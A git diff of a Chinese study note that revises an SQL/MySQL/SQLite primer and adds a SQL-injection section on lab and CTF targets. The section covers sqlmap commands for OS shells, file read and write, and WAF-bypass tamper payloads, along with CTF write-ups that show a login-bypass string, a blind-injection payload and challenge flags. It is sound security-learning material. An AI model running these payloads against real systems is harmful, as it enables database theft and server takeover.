@@ -1,7 +1,10 @@
 # SQL
+
+
+## 什么是SQL？
 SQL (Structured Query Language:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）
 
-!!! note "What is RDBMS"
+??? note "What is RDBMS"
     即关系数据库管理系统(Relational Database Management System)的特点：
     1. 数据以表格的形式出现
     2. 每行为各种记录名称
@@ -9,35 +12,38 @@ SQL (Structured Query Language:结构化查询语言) 是用于管理关系数�
     4. 许多的行和列组成一张表单
     5. 若干的表单组成database
 
-windows下phpstudy环境变量配置
+SQL（Structured Query Language）是管理关系型数据库的标准语言。简单来说，它就是让我们能与数据库"对话"的一种特殊语言。想象一下，数据库就像一个巨大的数字仓库，而SQL就是你向仓库管理员发出的精确指令——"给我找出所有去年购买过产品的客户"，"把这些商品按价格从高到低排列"，或者"更新用户张三的电话号码"。
 
-[mysql](https://www.cnblogs.com/PHP0222wangdong/p/10674222.html)
+我第一次接触SQL时，惊讶于它如此接近自然语言的表达方式。`SELECT * FROM users WHERE age > 30`——这不就是在说"从用户表中选出所有年龄大于30岁的记录"吗？
 
-选择环境变量->选择下半区的系统变量里面的 Path 
-在Path中添加php和Mysql的地址
+## SQL与应用的关系
 
-新建文件夹后，进入到`...\phpstudy_pro\WWW`这个文件夹，把你需要的网站代码传到这个文件夹中。
+几乎所有现代应用都离不开数据库，而SQL就是与数据库交互的桥梁。无论是：
 
-访问方法`locoalhost/文件夹名/文件名`
+- 网站的用户数据存储
+- 移动应用的本地缓存
+- 企业级系统的交易记录
+- 数据分析平台的海量信息
+
+## SQL与应用的关系  
+
+SQL是**操作数据库的标准语言**，而MySQL、SQLite等则是**具体的数据库管理系统（DBMS）**。它们之间的关系可以这样理解：  
+
+- **SQL** 是通用的查询语言，定义了如何与数据库交互（如 `SELECT`, `INSERT`, `UPDATE`, `DELETE`）。  
+- **MySQL** 是一个**客户端-服务器型**的关系数据库，适合Web应用、企业级系统等需要多用户并发访问的场景。  
+- **SQLite** 是一个**嵌入式**数据库，整个数据库就是一个文件，适合移动端、桌面应用或小型项目，无需额外服务器。  
 
 
-```sql
-mysql –u root –p
+??? note "主要区别"
 
-mysql> SHOW DATABASES;  /*输出所有的数据库*/
+    | 特性        | MySQL              | SQLite             |  
+    |------------|--------------------|--------------------|  
+    | **架构**    | 客户端-服务器模式   | 嵌入式，无独立服务 |  
+    | **适用场景**| 高并发、多用户访问 | 单机、轻量级应用   |  
+    | **存储方式**| 数据存储在服务器   | 整个DB是一个文件   |  
+    | **性能**    | 适合大规模数据     | 轻量，低开销       |  
 
-mysql> USE db_name;  /*使用某个其中一个数据库*/
 
-mysql> SHOW TABLES;  /*显示数据库中的表*/
-
-mysql> SHOW COLUMNS FROM table_name; /*输出列*/
-```
-
-当数据库名字含有保留字时候，必须使用反引号
-```sql
-show columns from `table_name`;
-show columns from db_name.`table_name`;
-```
 
 
 ## 语法
@@ -57,17 +63,21 @@ show columns from db_name.`table_name`;
 ```
 
 ### 查
-SELECT 语句用于从数据库中选取数据。
+**SELECT 语句用于从数据库中选取数据。**
 
 结果被存储在一个结果表中，称为结果集。
+
+```
 if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)
 if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)
+```
 
 ```sql
 SELECT column1, column2, ... FROM table_name;
 ```
-**column1, column2, ...** ：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。
-**table_name** ：要查询的表名称。
+- `column1`, `column2`, ...：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。
+
+- `table_name`：要查询的表名称。
 
 **SELECT DISITINCT 选出不同的值**
 ```sql
@@ -216,14 +226,12 @@ SELECT col_name1, col_name2… FROM table_name LIMIT M OFFSET N  /*也�
 
 SELECT concat(col_name1, col_name2…) FROM table_name /*整合列数据*/
 SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/
-
-
 ```
 
 
 **一些常用的URL编码：**
 
-|||
+|Character|URL Encode|
 |---|---|
 |Space|`%20`|
 |# 	|`%23`|
@@ -231,10 +239,10 @@ SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、
 |"|	`%22`|
 |+	|`%2B`|
 
-#+$-_.!*() 浏览器地址栏默认不编码，但是不意味着不能编码
+`#+$-_.!*()`浏览器地址栏默认不编码，但是不意味着不能编码
 
 
-## MySQL
+## 应用 —— MySQL
 
 > MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。
 
@@ -251,7 +259,56 @@ MySQL 为关系型数据库(Relational Database Management System), 这种所谓
 
 [Mysql之自带四库之sys库\_mysql sys库-CSDN博客](https://blog.csdn.net/carefree2005/article/details/113798841)
 
-## SQL注入
+### 安装
+windows下phpstudy环境变量配置
+
+[mysql](https://www.cnblogs.com/PHP0222wangdong/p/10674222.html)
+
+选择环境变量->选择下半区的系统变量里面的 Path 
+在Path中添加php和Mysql的地址
+
+新建文件夹后，进入到`...\phpstudy_pro\WWW`这个文件夹，把你需要的网站代码传到这个文件夹中。
+
+访问方法`locoalhost/文件夹名/文件名`
+
+
+```sql
+mysql –u root –p
+
+mysql> SHOW DATABASES;  /*输出所有的数据库*/
+
+mysql> USE db_name;  /*使用某个其中一个数据库*/
+
+mysql> SHOW TABLES;  /*显示数据库中的表*/
+
+mysql> SHOW COLUMNS FROM table_name; /*输出列*/
+```
+
+当数据库名字含有保留字时候，必须使用反引号
+```sql
+show columns from `table_name`;
+show columns from db_name.`table_name`;
+```
+
+
+
+
+## 应用 —— Sqlite
+SQLite是一个轻量级的嵌入式关系型数据库，它以一个小型的C语言库的形式存在。它的设计目标是嵌入式的，而且已经在很多嵌入式产品中使用了它，它占用资源非常的低，在嵌入式设备中，可能只需要几百K的内存就够了。SQLite还具有跨平台的特性，可以在多个操作系统上运行包括Windows、MacOS、Linux等。
+
+
+
+### [DB Browser for SQLite](https://sqlitebrowser.org/dl/)
+
+
+### SqliteStudio
+
+
+[pawelsalawa/sqlitestudio](https://github.com/pawelsalawa/sqlitestudio): A free, open source, multi-platform SQLite database manager.
+
+
+
+## Security话题 —— SQL注入
 ### sqlmap使用
 
 kali自带sqlmap
@@ -277,261 +334,269 @@ kali自带sqlmap
 使用–batch参数，可以在所有需要用户输入的部分（通常是询问执行yes还是no），执行默认操作，不需要用户再输入
 
 #### 高级功能
-[SQLMap使用详解 - 未完成的歌QAQ - 博客园](https://www.cnblogs.com/wwcdg/p/15913888.html#3roles_154)
+> 参考 [SQLMap使用详解 - 未完成的歌QAQ - 博客园](https://www.cnblogs.com/wwcdg/p/15913888.html#3roles_154)
 
-**1、`--level 5`：探测等级**
+=== "1、`--level 5`：探测等级"
 
-参数--level 5指需要执行的测试等级，一共有5个等级（1~5），不加 level 默认是1。5级包含的 Payload 最多，会自动破解出 cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。
+    参数--level 5指需要执行的测试等级，一共有5个等级（1~5），不加 level 默认是1。5级包含的 Payload 最多，会自动破解出 cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。
 
-这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie 在 level 为2时就会测试，HTTP User-Agent/Referer 头在 level 为3时就会测试。总之，在不确定哪个 payload 或参数为注入点时，为了保证全面性，建议使用高的 level 值。
+    这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie 在 level 为2时就会测试，HTTP User-Agent/Referer 头在 level 为3时就会测试。总之，在不确定哪个 payload 或参数为注入点时，为了保证全面性，建议使用高的 level 值。
 
-**2、`--is-dba`：当前用户是否为管理权限**
+=== "2、`--is-dba`：当前用户是否为管理权限"
 
-该命令用于查看当前账户是否为数据库管理员账户，如下所示：
+    该命令用于查看当前账户是否为数据库管理员账户，如下所示：
+
+    ```shell
+    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba
+    ```
+
+=== "3、`--roles`：列出数据库管理员角色"
+
+    该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色，如图所示：
+
+    ```shell
+    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --roles
+    ```
+
+=== "4、`--referer`：HTTP referer头"
+
+    Sqlmap 可以在请求中伪造 HTTP 中的 referer，当--level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，例：
+
+    ```shell
+    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --referer http://www.baidu.com
+    ```
+
+=== "5、`--sql-shell`：运行自定义SQL语句"
+
+    该命令用于执行指定的SQL语句，如下所示，假设执行select * from users limit 0,1语句，如下所示：
+
+    ```shell
+    sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --sql-shell
+    ```
+
+=== "6、`--os-cmd`，`--os-shell`：运行任意操作系统命令"
+
+    在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。
+
+    如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。
+
+    用`--os-shell`参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。
+
+    Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是--is-dba的值要为True)。
+
+    - 执行系统命令：
 
 
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba
-在这里插入图片描述
+    ```shell
+    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-cmd=ipconfig
+    ```
+    执行后根据提示选择网站语言，然后回车，指定目标站点根目录，然后继续回车即可完整执行命令。
 
-**3、`--roles`：列出数据库管理员角色**
+    - 执行shell：
 
-该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色，如图所示：
-在这里插入图片描述
+    ```shell
+    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell
+    ```
+    执行后根据提示选择网站语言，然后回车，指定目标站点根目录后回车，输入命令即可执行。
 
-**4、`--referer`：HTTP referer头**
+    执行命令后会在网站根目录上传两个文件：tmpbxbxz.php、tmpuoiuz.php(此文件为上传页面)
 
-Sqlmap 可以在请求中伪造 HTTP 中的 referer，当--level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，例：
+=== "7、`--file-read`：从数据库服务器中读取文件"
 
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --referer http://www.baidu.com
+    该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。
+    ```shell
+    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read "C:/11.txt"
+    ```
+    在这里插入图片描述
+    执行完会把文件保存到本地目录下
+    在这里插入图片描述
 
-**5、`--sql-shell`：运行自定义SQL语句**
+=== "8、`--file-write` `--file-dest`：上传文件到数据库服务器中"
 
-该命令用于执行指定的SQL语句，如下所示，假设执行select * from users limit 0,1语句，如下所示：
+    该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。
+    ```shell
+    sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write "C:/1.txt" --file-dest "C:/windows/Temp/1.php"
+    ```
+    执行结束即可把本地的1.txt 文件上传到目标服务器下
+    在这里插入图片描述
 
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --sql-shell
-在这里插入图片描述
-
-**6、`--os-cmd`，`--os-shell`：运行任意操作系统命令**
-
-在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。
-
-如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。
-
-用`--os-shell`参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。
-
-Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是--is-dba的值要为True)。
-
-1.执行系统命令：
-
-
-```shell
-sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-cmd=ipconfig
-```
-执行后根据提示选择网站语言，然后回车，指定目标站点根目录，然后继续回车即可完整执行命令。
-
-2.执行shell：
-```shell
-sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell
-```
-执行后根据提示选择网站语言，然后回车，指定目标站点根目录后回车，输入命令即可执行。
-
-执行命令后会在网站根目录上传两个文件：tmpbxbxz.php、tmpuoiuz.php(此文件为上传页面)
-
-7、`--file-read`：从数据库服务器中读取文件
-
-该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。
-```shell
-sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read "C:/11.txt"
-```
-在这里插入图片描述
-执行完会把文件保存到本地目录下
-在这里插入图片描述
-
-8、`--file-write ``--file-dest`：上传文件到数据库服务器中
-
-该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。
-```shell
-sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write "C:/1.txt" --file-dest "C:/windows/Temp/1.php"
-```
-执行结束即可把本地的1.txt 文件上传到目标服务器下
-在这里插入图片描述
 #### tamper
 
 –tamper参数对数据做修改来绕过waf等设备
 ```shell
 sqlmap -u <url> --tamper <模块名>
 ```
+
 sqlmap的绕过脚本在目录usr/share/golismero/tools/sqlmap/tamper下
 
 
+??? note "脚本目录"
 
-**apostrophemask.py**
-适用数据库：ALL
-作用：将引号替换为utf-8，用于过滤单引号
-使用脚本前：`tamper("1 AND '1'='1")`
-使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`
+    **apostrophemask.py**
+    适用数据库：ALL
+    作用：将引号替换为utf-8，用于过滤单引号
+    使用脚本前：`tamper("1 AND '1'='1")`
+    使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`
 
-**base64encode.py**
-适用数据库：ALL
-作用：替换为base64编码
-使用脚本前：`tamper("1' AND SLEEP(5)#")`
-使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`
+    **base64encode.py**
+    适用数据库：ALL
+    作用：替换为base64编码
+    使用脚本前：`tamper("1' AND SLEEP(5)#")`
+    使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`
 
-**multiplespaces.py**
-适用数据库：ALL
-作用：围绕sql关键字添加多个空格
-使用脚本前：`tamper('1 UNION SELECT foobar')`
-使用脚本后：`1 UNION SELECT foobar`
+    **multiplespaces.py**
+    适用数据库：ALL
+    作用：围绕sql关键字添加多个空格
+    使用脚本前：`tamper('1 UNION SELECT foobar')`
+    使用脚本后：`1 UNION SELECT foobar`
 
-**space2plus.py**
-适用数据库：ALL
-作用：用加号替换空格
-使用脚本前：`tamper('SELECT id FROM users')`
-使用脚本后：`SELECT+id+FROM+users`
+    **space2plus.py**
+    适用数据库：ALL
+    作用：用加号替换空格
+    使用脚本前：`tamper('SELECT id FROM users')`
+    使用脚本后：`SELECT+id+FROM+users`
 
-**nonrecursivereplacement.py**
-适用数据库：ALL
-作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）
-使用脚本前：`tamper('1 UNION SELECT 2--')`
-使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`
+    **nonrecursivereplacement.py**
+    适用数据库：ALL
+    作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）
+    使用脚本前：`tamper('1 UNION SELECT 2--')`
+    使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`
 
-**space2randomblank.py**
-适用数据库：ALL
-作用：将空格替换为其他有效字符
-使用脚本前：`tamper('SELECT id FROM users')`
-使用脚本后：`SELECT%0Did%0DFROM%0Ausers`
+    **space2randomblank.py**
+    适用数据库：ALL
+    作用：将空格替换为其他有效字符
+    使用脚本前：`tamper('SELECT id FROM users')`
+    使用脚本后：`SELECT%0Did%0DFROM%0Ausers`
 
-**unionalltounion.py**
-适用数据库：ALL
-作用：将union allselect 替换为unionselect
-使用脚本前：`tamper('-1 UNION ALL SELECT')`
-使用脚本后：`-1 UNION SELECT`
+    **unionalltounion.py**
+    适用数据库：ALL
+    作用：将union allselect 替换为unionselect
+    使用脚本前：`tamper('-1 UNION ALL SELECT')`
+    使用脚本后：`-1 UNION SELECT`
 
-**securesphere.py**
-适用数据库：ALL
-作用：追加特定的字符串
-使用脚本前：`tamper('1 AND 1=1')`
-使用脚本后：`1 AND 1=1 and '0having'='0having'`
+    **securesphere.py**
+    适用数据库：ALL
+    作用：追加特定的字符串
+    使用脚本前：`tamper('1 AND 1=1')`
+    使用脚本后：`1 AND 1=1 and '0having'='0having'`
 
-**space2dash.py**
-适用数据库：ALL
-作用：将空格替换为--，并添加一个随机字符串和换行符
-使用脚本前：`tamper('1 AND 9227=9227')`
-使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
+    **space2dash.py**
+    适用数据库：ALL
+    作用：将空格替换为--，并添加一个随机字符串和换行符
+    使用脚本前：`tamper('1 AND 9227=9227')`
+    使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
 
-**space2mssqlblank.py**
-适用数据库：Microsoft SQL Server
-测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005
-作用：将空格随机替换为其他空格符号('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
-使用脚本前：`tamper('SELECT id FROM users')`
-使用脚本后：`SELECT%0Eid%0DFROM%07users`
+    **space2mssqlblank.py**
+    适用数据库：Microsoft SQL Server
+    测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005
+    作用：将空格随机替换为其他空格符号('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
+    使用脚本前：`tamper('SELECT id FROM users')`
+    使用脚本后：`SELECT%0Eid%0DFROM%07users`
 
-**between.py**
-测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-作用：用NOT BETWEEN 0 AND #替换>
-使用脚本前：`tamper('1 AND A > B--')`
-使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`
+    **between.py**
+    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+    作用：用NOT BETWEEN 0 AND #替换>
+    使用脚本前：`tamper('1 AND A > B--')`
+    使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`
 
-**percentage.py**
-适用数据库：ASP
-测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
-作用：在每个字符前添加一个%
-使用脚本前：`tamper('SELECT FIELD FROM TABLE')`
-使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`
+    **percentage.py**
+    适用数据库：ASP
+    测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
+    作用：在每个字符前添加一个%
+    使用脚本前：`tamper('SELECT FIELD FROM TABLE')`
+    使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`
 
-**sp_password.py**
-适用数据库：MSSQL
-作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password
-使用脚本前：tamper('1 AND 9227=9227-- ')
-使用脚本后：1 AND 9227=9227-- sp_password
+    **sp_password.py**
+    适用数据库：MSSQL
+    作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password
+    使用脚本前：tamper('1 AND 9227=9227-- ')
+    使用脚本后：1 AND 9227=9227-- sp_password
 
-**charencode.py**
-测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）
-使用脚本前：tamper('SELECT FIELD FROM%20TABLE')
-使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
+    **charencode.py**
+    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+    作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）
+    使用脚本前：tamper('SELECT FIELD FROM%20TABLE')
+    使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
 
-**randomcase.py**
-测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-作用：随机大小写
-使用脚本前：tamper('INSERT')
-使用脚本后：INseRt
+    **randomcase.py**
+    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+    作用：随机大小写
+    使用脚本前：tamper('INSERT')
+    使用脚本后：INseRt
 
-**charunicodeencode.py**
-适用数据库：ASP、ASP.NET
-测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3
-作用：适用字符串的unicode编码
-使用脚本前：tamper('SELECT FIELD%20FROM TABLE')
-使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045
+    **charunicodeencode.py**
+    适用数据库：ASP、ASP.NET
+    测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3
+    作用：适用字符串的unicode编码
+    使用脚本前：tamper('SELECT FIELD%20FROM TABLE')
+    使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045
 
-**space2comment.py**
-测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-作用：将空格替换为/**/
-使用脚本前：tamper('SELECT id FROM users')
-使用脚本后：SELECT/**/id/**/FROM/**/users
+    **space2comment.py**
+    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+    作用：将空格替换为/**/
+    使用脚本前：tamper('SELECT id FROM users')
+    使用脚本后：SELECT/**/id/**/FROM/**/users
 
-**equaltolike.py**
-测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5
-作用：将=替换为LIKE
-使用脚本前：tamper('SELECT * FROM users WHERE id=1')
-使用脚本后：SELECT * FROM users WHERE id LIKE 1
+    **equaltolike.py**
+    测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5
+    作用：将=替换为LIKE
+    使用脚本前：tamper('SELECT * FROM users WHERE id=1')
+    使用脚本后：SELECT * FROM users WHERE id LIKE 1
 
-**equaltolike.py**
-测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-作用：将>替换为GREATEST，绕过对>的过滤
-使用脚本前：tamper('1 AND A > B')
-使用脚本后：1 AND GREATEST(A,B+1)=A
+    **equaltolike.py**
+    测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+    作用：将>替换为GREATEST，绕过对>的过滤
+    使用脚本前：tamper('1 AND A > B')
+    使用脚本后：1 AND GREATEST(A,B+1)=A
 
-**modsecurityversioned.py**
-适用数据库：MySQL
-测试通过数据库：MySQL 5.0
-作用：过滤空格，使用mysql内联注释的方式进行注入
-使用脚本前：tamper('1 AND 2>1--')
-使用脚本后：1 /*!30874AND 2>1*/--
+    **modsecurityversioned.py**
+    适用数据库：MySQL
+    测试通过数据库：MySQL 5.0
+    作用：过滤空格，使用mysql内联注释的方式进行注入
+    使用脚本前：tamper('1 AND 2>1--')
+    使用脚本后：1 /*!30874AND 2>1*/--
 
-**space2mysqlblank.py**
-适用数据库：MySQL
-测试通过数据库：MySQL 5.1
-作用：将空格替换为其他空格符号('%09', '%0A', '%0C', '%0D', '%0B')
-使用脚本前：tamper('SELECT id FROM users')
-使用脚本后：SELECT%0Bid%0DFROM%0Cusers
+    **space2mysqlblank.py**
+    适用数据库：MySQL
+    测试通过数据库：MySQL 5.1
+    作用：将空格替换为其他空格符号('%09', '%0A', '%0C', '%0D', '%0B')
+    使用脚本前：tamper('SELECT id FROM users')
+    使用脚本后：SELECT%0Bid%0DFROM%0Cusers
 
-**modsecurityzeroversioned.py**
-适用数据库：MySQL
-测试通过数据库：MySQL 5.0
-作用：使用内联注释方式（/*!00000*/）进行注入
-使用脚本前：tamper('1 AND 2>1--')
-使用脚本后：1 /*!00000AND 2>1*/--
+    **modsecurityzeroversioned.py**
+    适用数据库：MySQL
+    测试通过数据库：MySQL 5.0
+    作用：使用内联注释方式（/*!00000*/）进行注入
+    使用脚本前：tamper('1 AND 2>1--')
+    使用脚本后：1 /*!00000AND 2>1*/--
 
-**space2mysqldash.py**
-适用数据库：MySQL、MSSQL
-作用：将空格替换为 -- ，并追随一个换行符
-使用脚本前：tamper('1 AND 9227=9227')
-使用脚本后：1--%0AAND--%0A9227=9227
+    **space2mysqldash.py**
+    适用数据库：MySQL、MSSQL
+    作用：将空格替换为 -- ，并追随一个换行符
+    使用脚本前：tamper('1 AND 9227=9227')
+    使用脚本后：1--%0AAND--%0A9227=9227
 
-**space2morehash.py**
-适用数据库：MySQL >= 5.1.13
-测试通过数据库：MySQL 5.1.41
-作用：将空格替换为#，并添加一个随机字符串和换行符
-使用脚本前：tamper('1 AND 9227=9227')
-使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227
+    **space2morehash.py**
+    适用数据库：MySQL >= 5.1.13
+    测试通过数据库：MySQL 5.1.41
+    作用：将空格替换为#，并添加一个随机字符串和换行符
+    使用脚本前：tamper('1 AND 9227=9227')
+    使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227
 
-**appendnullbyte.py**
-适用数据库：ALL
-作用：在有效载荷的结束位置加载null字节字符编码
-使用脚本前：tamper('1 AND 1=1')
-使用脚本后：1 AND 1=1%00
+    **appendnullbyte.py**
+    适用数据库：ALL
+    作用：在有效载荷的结束位置加载null字节字符编码
+    使用脚本前：tamper('1 AND 1=1')
+    使用脚本后：1 AND 1=1%00
 
-**randomcomments.py**
-适用数据库：ALL
-作用：用注释符分割sql关键字
-使用脚本前：tamper('INSERT')
-使用脚本后：I/**/N/**/SERT
+    **randomcomments.py**
+    适用数据库：ALL
+    作用：用注释符分割sql关键字
+    使用脚本前：tamper('INSERT')
+    使用脚本后：I/**/N/**/SERT
 
 
-## 网站注入实例
-
-### [SchoolBus - SQL injection](https://zjusec.com/challenges/16)
+### 实例1 [SchoolBus - SQL injection](https://zjusec.com/challenges/16)
 
 打开网站，发现是一个问答的网站，非常明显的sql注入点
 ![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801183459.png)
@@ -554,7 +619,7 @@ sqlmap -u http://10.214.160.13:10002/?questionid=0 --current-db --tamper space2r
 
 ![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/cc3a0a22acb55bd08b8eed78d0c2d20.png)
 
-### [SchoolBus - php include 文件注入](http://10.214.160.13:10001/index.php?f=upload.php)
+### 实例2 [SchoolBus - php include 文件注入](http://10.214.160.13:10001/index.php?f=upload.php)
 
 > 拓展链接 
 > - [技术剖析中国菜刀原理](https://blog.csdn.net/JackLiu16/article/details/79418652)
@@ -632,7 +697,7 @@ flag = AAA{m310dy_1s_wAitinG_4_y0u_h3r3_qq_qun_386796080}
 
 
 
-### 例题1
+### 实例3
 **登录界面注入**
 
 用户名 `aaa' or 1=1 #`
@@ -854,7 +919,7 @@ AAA{now_y0u_can_try_web_400_lol}
 
 另外如果能拿到shell的话,就可以直接读取文件,这样就会方便很多
 
-### 例题2
+### 实例4
 
 首先是获取源码,在`nginx.conf`下获取到了root地址
 
